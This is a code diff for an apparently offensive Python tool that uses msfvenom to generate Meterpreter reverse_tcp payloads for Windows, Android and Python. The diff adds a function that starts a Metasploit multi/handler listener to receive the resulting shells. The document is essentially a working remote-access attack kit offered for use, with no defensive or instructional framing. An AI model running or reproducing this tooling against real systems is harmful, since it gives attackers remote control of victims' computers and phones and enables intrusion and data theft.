@@ -10,6 +10,14 @@ from pystyle import *
 #=-----------=#
 LHOST = socket.gethostbyname(socket.gethostname())
 LPORT = 4444
+
+def exploit(device, lhost , lport):
+    ASK = inquirer.confirm(message="Do You Want To Start Exploiting?", default=True).execute()
+    if ASK:
+        print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Starting..!{Col.reset}")
+        os.system(f'msfconsole -q -x " use exploit/multi/handler; set payload {device}/meterpreter/reverse_tcp; set lhost {lhost}; set lport {lport}; exploit;')
+    else:
+        print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}OK..!{Col.reset}")
 def run(_version_):
     global LHOST , LPORT
     System.Clear()
@@ -60,14 +68,17 @@ def run(_version_):
                 with open('/dev/null', 'w') as nullfile:
                     subprocess.run(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o MegaPayload.exe", shell=True, stdout=nullfile, stderr=subprocess.STDOUT)
                 print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}The Payload Has Been Created...!{Col.yellow}{Col.reset}")
+                exploit(device="windows", lhost=LHOST , lport=LPORT)
             elif PAYLOAD_INPUT == "Android Payload":
                 with open('/dev/null', 'w') as nullfile:
                     subprocess.run(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o MegaPayload.apk", shell=True, stdout=nullfile, stderr=subprocess.STDOUT)
                 print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}The Payload Has Been Created...!{Col.yellow}{Col.reset}")
+                exploit(device="android", lhost=LHOST , lport=LPORT)
             else:
                 with open('/dev/null', 'w') as nullfile:
                     subprocess.run(f"msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o MegaPayload.py", shell=True, stdout=nullfile, stderr=subprocess.STDOUT)
                 print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}The Payload Has Been Created...!{Col.yellow}{Col.reset}")
+                exploit(device="python", lhost=LHOST , lport=LPORT)
         elif USER_INPUT == "Modify Settings":
             print(f"{Col.red}[{Col.yellow}+{Col.red}] {Col.reset}Current Setting -> {Col.yellow}{LHOST}:{LPORT}")
             LHOST = input(f"{Col.red}[{Col.yellow}?{Col.red}] {Col.reset}LHOST{Col.yellow}=")
